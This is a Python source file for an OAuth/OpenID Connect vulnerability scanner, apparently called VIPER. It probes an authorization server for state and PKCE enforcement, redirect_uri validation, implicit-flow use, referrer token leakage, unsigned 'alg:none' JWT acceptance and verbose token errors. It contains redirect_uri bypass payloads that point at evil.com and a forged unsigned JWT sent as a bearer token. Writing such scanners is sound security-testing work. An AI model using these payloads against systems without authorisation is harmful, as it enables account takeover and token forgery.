#!/usr/bin/env python3
"""
VIPER OAuth Fuzzer — Test OAuth/OpenID Connect implementations for vulnerabilities.

Tests:
- state parameter bypass
- redirect_uri manipulation (open redirect, subdomain takeover)
- token leakage via referrer headers
- PKCE bypass (code_challenge downgrade)
- implicit flow downgrade
- JWT algorithm none attack
- authorization code reuse
"""

import asyncio
import base64
import hashlib
import json
import logging
import secrets
import time
import urllib.parse
import urllib.request
import ssl
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

logger = logging.getLogger("viper.oauth_fuzzer")


@dataclass
class OAuthFinding:
    """Result from an OAuth fuzz test."""
    test_name: str
    vulnerable: bool
    severity: str = "info"
    cvss: float = 0.0
    description: str = ""
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    reproduction_steps: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "test_name": self.test_name,
            "vulnerable": self.vulnerable,
            "severity": self.severity,
            "cvss": self.cvss,
            "description": self.description,
            "evidence": self.evidence,
            "endpoint": self.endpoint,
            "payload": self.payload,
            "reproduction_steps": self.reproduction_steps,
        }


class OAuthFuzzer:
    """Test OAuth/OIDC implementations for common vulnerabilities.

    All tests are non-destructive: they observe server behavior without
    modifying data or completing malicious flows.

    Args:
        target_url: Base URL of the OAuth authorization server.
        client_id: OAuth client ID (public, non-secret).
        redirect_uri: Legitimate redirect URI for the application.
    """

    def __init__(
        self,
        target_url: str,
        client_id: str = "",
        redirect_uri: str = "",
        timeout: int = 15,
    ):
        self.target_url = target_url.rstrip("/")
        self.client_id = client_id
        self.redirect_uri = redirect_uri
        self.timeout = timeout
        self._ssl_ctx = ssl.create_default_context()
        self.findings: List[OAuthFinding] = []

    async def run_all(self) -> List[OAuthFinding]:
        """Run all OAuth tests and return findings."""
        tests = [
            self.state_bypass,
            self.redirect_uri_manipulation,
            self.token_leakage,
            self.pkce_bypass,
            self.implicit_flow_downgrade,
            self.jwt_alg_none,
            self.authorization_code_reuse,
        ]

        for test in tests:
            try:
                finding = await test()
                if finding:
                    self.findings.append(finding)
            except Exception as exc:
                logger.debug("OAuth test %s failed: %s", test.__name__, exc)

        return self.findings

    async def state_bypass(self) -> Optional[OAuthFinding]:
        """Test for missing or weak state parameter validation.

        If the server issues an authorization code without a state parameter,
        it's vulnerable to CSRF attacks on the OAuth flow.
        """
        auth_url = f"{self.target_url}/authorize"
        params = {
            "response_type": "code",
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
            "scope": "openid",
            # Intentionally omit state parameter
        }

        url = f"{auth_url}?{urllib.parse.urlencode(params)}"
        try:
            req = urllib.request.Request(url, method="GET", headers={
                "User-Agent": "VIPER-OAuthFuzzer/1.0",
            })
            resp = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: urllib.request.urlopen(req, timeout=self.timeout, context=self._ssl_ctx),
            )

            # If we get a redirect to redirect_uri without requiring state
            location = resp.getheader("Location", "") or resp.url
            if resp.status < 400 and "state" not in location.lower():
                return OAuthFinding(
                    test_name="state_bypass",
                    vulnerable=True,
                    severity="medium",
                    cvss=5.4,
                    description="OAuth authorization endpoint accepts requests without state parameter, enabling CSRF attacks.",
                    evidence=f"Status: {resp.status}, No state parameter required",
                    endpoint=auth_url,
                    payload=url,
                    reproduction_steps=[
                        f"Send authorization request to {auth_url} without state parameter",
                        "Observe that the server processes the request without error",
                        "This enables CSRF on the OAuth authorization flow",
                    ],
                )
        except urllib.error.HTTPError as e:
            if e.code not in (400, 401, 403):
                logger.debug("state_bypass: HTTP %d", e.code)
        except Exception as exc:
            logger.debug("state_bypass: %s", exc)

        return None

    async def redirect_uri_manipulation(self) -> Optional[OAuthFinding]:
        """Test redirect_uri for open redirect / manipulation.

        Tries various bypass techniques against redirect_uri validation.
        """
        auth_url = f"{self.target_url}/authorize"
        parsed = urllib.parse.urlparse(self.redirect_uri)
        base_domain = parsed.netloc

        # Bypass payloads (non-destructive — just test if server accepts them)
        manipulated_uris = [
            f"https://evil.com",
            f"https://{base_domain}.evil.com",
            f"https://evil.com@{base_domain}",
            f"{self.redirect_uri}/../evil",
            f"{self.redirect_uri}?next=https://evil.com",
            f"{self.redirect_uri}#@evil.com",
            f"https://{base_domain}%40evil.com",
        ]

        for uri in manipulated_uris:
            params = {
                "response_type": "code",
                "client_id": self.client_id,
                "redirect_uri": uri,
                "scope": "openid",
                "state": secrets.token_urlsafe(16),
            }
            url = f"{auth_url}?{urllib.parse.urlencode(params)}"

            try:
                req = urllib.request.Request(url, method="GET", headers={
                    "User-Agent": "VIPER-OAuthFuzzer/1.0",
                })
                resp = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda r=req: urllib.request.urlopen(r, timeout=self.timeout, context=self._ssl_ctx),
                )
                location = resp.getheader("Location", "") or ""

                # Check if the manipulated URI was accepted
                if resp.status < 400 and ("evil.com" in location or resp.status == 302):
                    return OAuthFinding(
                        test_name="redirect_uri_manipulation",
                        vulnerable=True,
                        severity="high",
                        cvss=8.1,
                        description=f"OAuth redirect_uri validation bypassed with: {uri}",
                        evidence=f"Server accepted manipulated redirect_uri. Status: {resp.status}, Location: {location[:200]}",
                        endpoint=auth_url,
                        payload=uri,
                        reproduction_steps=[
                            f"Send authorization request with redirect_uri={uri}",
                            "Observe server accepts the manipulated URI",
                            "Attacker can steal authorization codes via open redirect",
                        ],
                    )
            except urllib.error.HTTPError:
                continue
            except Exception:
                continue

        return None

    async def token_leakage(self) -> Optional[OAuthFinding]:
        """Test for token leakage via Referrer header.

        If the OAuth callback page has external links, tokens in URL fragments
        or query params can leak via the Referer header.
        """
        # Check if the redirect URI page has external resources
        try:
            req = urllib.request.Request(self.redirect_uri, headers={
                "User-Agent": "VIPER-OAuthFuzzer/1.0",
            })
            resp = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: urllib.request.urlopen(req, timeout=self.timeout, context=self._ssl_ctx),
            )
            body = resp.read().decode("utf-8", errors="replace")[:10000]

            # Check for Referrer-Policy header
            referrer_policy = resp.getheader("Referrer-Policy", "")
            has_policy = referrer_policy in ("no-referrer", "same-origin", "strict-origin",
                                              "strict-origin-when-cross-origin")

            # Check for external resources that could leak tokens
            external_indicators = [
                "src=\"http", "src='http", "href=\"http", "href='http",
                "googleapis.com", "cdn.", "analytics.", "facebook.com",
            ]
            has_external = any(ind in body.lower() for ind in external_indicators)

            if has_external and not has_policy:
                return OAuthFinding(
                    test_name="token_leakage",
                    vulnerable=True,
                    severity="medium",
                    cvss=5.3,
                    description="OAuth callback page has external resources without Referrer-Policy, tokens may leak via Referer header.",
                    evidence=f"Referrer-Policy: {referrer_policy or 'not set'}, External resources detected",
                    endpoint=self.redirect_uri,
                    reproduction_steps=[
                        f"Visit OAuth callback page at {self.redirect_uri}",
                        "Observe external resources loaded without Referrer-Policy",
                        "Tokens in URL can leak via Referer header to external domains",
                    ],
                )
        except Exception as exc:
            logger.debug("token_leakage: %s", exc)

        return None

    async def pkce_bypass(self) -> Optional[OAuthFinding]:
        """Test PKCE code_challenge downgrade.

        If the server accepts authorization requests without code_challenge
        when PKCE should be required, it's vulnerable.
        """
        auth_url = f"{self.target_url}/authorize"

        # Request WITHOUT PKCE parameters
        params = {
            "response_type": "code",
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
            "scope": "openid",
            "state": secrets.token_urlsafe(16),
            # Intentionally omit code_challenge and code_challenge_method
        }

        url = f"{auth_url}?{urllib.parse.urlencode(params)}"
        try:
            req = urllib.request.Request(url, method="GET", headers={
                "User-Agent": "VIPER-OAuthFuzzer/1.0",
            })
            resp = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: urllib.request.urlopen(req, timeout=self.timeout, context=self._ssl_ctx),
            )

            if resp.status < 400:
                return OAuthFinding(
                    test_name="pkce_bypass",
                    vulnerable=True,
                    severity="medium",
                    cvss=5.9,
                    description="Server accepts authorization requests without PKCE code_challenge, enabling authorization code interception.",
                    evidence=f"Status: {resp.status} without code_challenge",
                    endpoint=auth_url,
                    payload=url,
                    reproduction_steps=[
                        f"Send authorization request to {auth_url} without code_challenge",
                        "Observe the server processes the request",
                        "PKCE is not enforced, enabling code interception attacks",
                    ],
                )
        except Exception as exc:
            logger.debug("pkce_bypass: %s", exc)

        return None

    async def implicit_flow_downgrade(self) -> Optional[OAuthFinding]:
        """Test if server can be forced to use implicit flow (response_type=token).

        Implicit flow exposes tokens in URL fragments, which is less secure.
        """
        auth_url = f"{self.target_url}/authorize"
        params = {
            "response_type": "token",  # Force implicit flow
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
            "scope": "openid",
            "state": secrets.token_urlsafe(16),
        }

        url = f"{auth_url}?{urllib.parse.urlencode(params)}"
        try:
            req = urllib.request.Request(url, method="GET", headers={
                "User-Agent": "VIPER-OAuthFuzzer/1.0",
            })
            resp = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: urllib.request.urlopen(req, timeout=self.timeout, context=self._ssl_ctx),
            )
            location = resp.getheader("Location", "") or ""

            if resp.status < 400 and ("access_token" in location or "#" in location):
                return OAuthFinding(
                    test_name="implicit_flow_downgrade",
                    vulnerable=True,
                    severity="high",
                    cvss=7.4,
                    description="Server accepts implicit flow (response_type=token), exposing tokens in URL fragments.",
                    evidence=f"Status: {resp.status}, Location contains token fragment",
                    endpoint=auth_url,
                    payload="response_type=token",
                    reproduction_steps=[
                        f"Send authorization request with response_type=token",
                        "Observe server issues token in URL fragment",
                        "Tokens exposed in browser history and referrer headers",
                    ],
                )
        except Exception as exc:
            logger.debug("implicit_flow_downgrade: %s", exc)

        return None

    async def jwt_alg_none(self) -> Optional[OAuthFinding]:
        """Test if server accepts JWT tokens with alg:none.

        Crafts a JWT with algorithm set to 'none' and empty signature.
        """
        # Craft a minimal JWT with alg:none
        header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
        payload = base64.urlsafe_b64encode(json.dumps({
            "sub": "test",
            "iss": self.target_url,
            "exp": int(time.time()) + 3600,
        }).encode()).rstrip(b"=")
        token = f"{header.decode()}.{payload.decode()}."

        # Try common token validation endpoints
        endpoints = [
            f"{self.target_url}/userinfo",
            f"{self.target_url}/api/me",
            f"{self.target_url}/oauth/userinfo",
        ]

        for endpoint in endpoints:
            try:
                req = urllib.request.Request(endpoint, headers={
                    "Authorization": f"Bearer {token}",
                    "User-Agent": "VIPER-OAuthFuzzer/1.0",
                })
                resp = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda r=req: urllib.request.urlopen(r, timeout=self.timeout, context=self._ssl_ctx),
                )

                if resp.status == 200:
                    body = resp.read().decode("utf-8", errors="replace")[:1000]
                    return OAuthFinding(
                        test_name="jwt_alg_none",
                        vulnerable=True,
                        severity="critical",
                        cvss=9.8,
                        description="Server accepts JWT tokens with alg:none (unsigned), enabling token forgery.",
                        evidence=f"Endpoint {endpoint} accepted unsigned JWT. Response: {body[:200]}",
                        endpoint=endpoint,
                        payload=token,
                        reproduction_steps=[
                            "Craft JWT with header alg:none and empty signature",
                            f"Send to {endpoint} with Authorization: Bearer <token>",
                            "Observe server accepts the unsigned token",
                        ],
                    )
            except urllib.error.HTTPError:
                continue
            except Exception:
                continue

        return None

    async def authorization_code_reuse(self) -> Optional[OAuthFinding]:
        """Test if authorization codes can be replayed.

        This is a detection-only test: we check if the token endpoint
        provides error messages that indicate code reuse is possible.

        Note: we cannot fully test this without a valid code, so this
        checks server error responses for information disclosure.
        """
        token_url = f"{self.target_url}/token"
        fake_code = "test_code_" + secrets.token_urlsafe(16)

        data = urllib.parse.urlencode({
            "grant_type": "authorization_code",
            "code": fake_code,
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
        }).encode()

        try:
            req = urllib.request.Request(token_url, data=data, method="POST", headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "VIPER-OAuthFuzzer/1.0",
            })
            resp = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: urllib.request.urlopen(req, timeout=self.timeout, context=self._ssl_ctx),
            )
            body = resp.read().decode("utf-8", errors="replace")[:2000]
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")[:2000] if e.fp else ""
        except Exception:
            return None

        # Check for verbose error messages that leak implementation details
        leak_indicators = ["expired", "already used", "invalid_grant", "stack trace",
                          "exception", "sql", "database", "internal"]
        found = [ind for ind in leak_indicators if ind.lower() in body.lower()]

        if found:
            return OAuthFinding(
                test_name="authorization_code_reuse",
                vulnerable=False,  # Information disclosure, not full vuln
                severity="low",
                cvss=3.1,
                description="Token endpoint returns verbose error messages that leak implementation details.",
                evidence=f"Error response contains: {', '.join(found)}",
                endpoint=token_url,
                reproduction_steps=[
                    f"Send POST to {token_url} with invalid authorization code",
                    "Observe verbose error response",
                ],
            )

        return None


__all__ = ["OAuthFuzzer", "OAuthFinding"]
